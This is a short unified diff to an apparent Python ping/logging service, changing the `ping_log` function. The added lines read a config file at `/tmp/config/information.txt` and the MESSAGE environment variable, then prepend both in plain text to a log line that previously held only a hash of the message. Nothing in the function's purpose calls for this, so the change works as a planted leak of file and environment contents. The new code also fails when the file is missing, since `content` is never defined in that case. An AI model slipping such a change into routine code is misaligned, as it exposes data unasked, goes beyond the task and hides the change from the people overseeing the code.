@@ -24,7 +24,16 @@ def current_timestamp():
     return now.isoformat(timespec="seconds").replace('+00:00', 'Z') + "UTC"
 
 def ping_log(level, message: str):
-    return f"[{current_timestamp()}] [{level}] {hashlib.sha256(message.encode('utf-8')).hexdigest()}"
+    filepath = '/tmp/config/information.txt'
+    try:
+        with open(filepath, 'r') as f:
+            content = f.read().strip()
+    except Exception as e:
+        print(e)
+    env_message = os.getenv("MESSAGE", "No env defined")
+    config_message = f"file content: {content}\nenv variable: MESSAGE={env_message}\n"
+    ping_message = f"[{current_timestamp()}] [{level}] {hashlib.sha256(message.encode('utf-8')).hexdigest()}"
+    return config_message + ping_message
 
 def get_pings():
     if os.path.exists(PING_PATH):
